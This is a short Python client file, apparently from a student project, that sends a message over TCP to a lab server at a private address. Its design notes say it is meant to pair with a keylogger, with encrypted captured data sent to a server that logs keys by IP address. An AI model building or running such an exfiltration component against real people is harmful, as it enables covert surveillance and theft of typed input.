'''
Basics of server.py from Amy Csizmar Dalal CS331 Networks Fall 2025
https://github.com/acdalal/cs331-gopher/blob/main/gopherClient.py


Input message and send it! Then immediately close connection.

Consider putting this into the keylogger file? or maybe when doing encryption as
well it'll be nice to be separated...


I think the total message should be: 
AES(message) || P_server(AES key) || HASH (message so far)

then server decrypts the AES key and saves it with the IP address in a file
just for fun with the starting timer
do the encryption and hashing stuff AFTER config and setting up the files that
create files!!

server side checks if hash works, then continue (if not then delete)
--> do the hashing LAST!
what attack does hashing stop? message being modified in transit or data being lost
that TCP didn't notice

'''
import socket

SERVER_PORT = 48939
# SERVER_NAME = "localhost"
SERVER_NAME = "192.168.64.2"

def sendMessage(message):

	clientSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try: 
		clientSock.connect((SERVER_NAME, SERVER_PORT))
	except:
		print("FAILED TO CONNECT TO SERVER")
		return

	try:
		encoded = message.encode("ascii")
	except:
		encoded = "COULD NOT ENCODE"

	clientSock.send(encoded)

	clientSock.close()
